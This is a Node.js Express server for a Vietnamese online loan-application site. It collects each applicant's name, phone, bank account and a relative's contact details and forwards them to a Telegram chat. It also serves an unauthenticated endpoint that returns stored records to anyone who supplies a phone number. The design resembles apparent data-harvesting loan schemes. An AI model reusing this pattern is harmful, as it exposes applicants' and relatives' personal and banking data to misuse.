const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Chỉ định cho Express phục vụ file tĩnh từ thư mục 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Đọc thông tin Bot Telegram từ Render Environment
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// Hàm gửi tin nhắn sang Telegram
async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('⚠️ Chưa cấu hình TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID');
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log('✅ Đã gửi thông báo Telegram!');
    } catch (e) {
        console.error('❌ Lỗi gửi Telegram:', e.message);
    }
}

// Lưu trữ dữ liệu tạm trong bộ nhớ
let loans = [];

// API: Tiếp nhận hồ sơ vay
app.post('/api/submit-loan', (req, res) => {
    const { fullName, phone, bankName, bankAccount, amount, days, relativeRelation, relativeName, relativePhone } = req.body;

    if (!fullName || !phone || !bankName || !bankAccount) {
        return res.json({ success: false, message: 'Vui lòng điền đầy đủ thông tin!' });
    }

    const loanId = 'VAY' + Math.floor(100000 + Math.random() * 900000);
    const newLoan = {
        loanId, fullName, phone, bankName, bankAccount,
        amount: parseInt(amount || 0),
        days: parseInt(days || 7),
        relativeRelation, relativeName, relativePhone,
        status: 'Chờ duyệt',
        createdAt: new Date().toLocaleString('vi-VN')
    };
    loans.push(newLoan);

    // Bắn thông báo về Telegram
    const msg = `🚨 <b>HỒ SƠ VAY MỚI (#${loanId})</b>\n` +
                `👤 <b>Họ tên:</b> ${fullName}\n` +
                `📞 <b>SĐT:</b> ${phone}\n` +
                `💰 <b>Số tiền:</b> ${newLoan.amount.toLocaleString('vi-VN')} VNĐ (${days} ngày)\n` +
                `🏦 <b>Ngân hàng:</b> ${bankName} - ${bankAccount}\n` +
                `👨‍👩‍👧 <b>Người thân:</b> ${relativeName || 'N/A'} (${relativeRelation || 'N/A'} - ${relativePhone || 'N/A'})`;
    
    sendTelegram(msg);

    res.json({ success: true, loanId });
});

// API: Tra cứu hồ sơ theo SĐT
app.get('/api/search-loan/:phone', (req, res) => {
    const userLoans = loans.filter(l => l.phone === req.params.phone);
    res.json({ success: true, loans: userLoans });
});

// Trả về file giao diện trang chủ index.html khi người dùng mở link web
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server đang chạy tại cổng ${PORT}`));
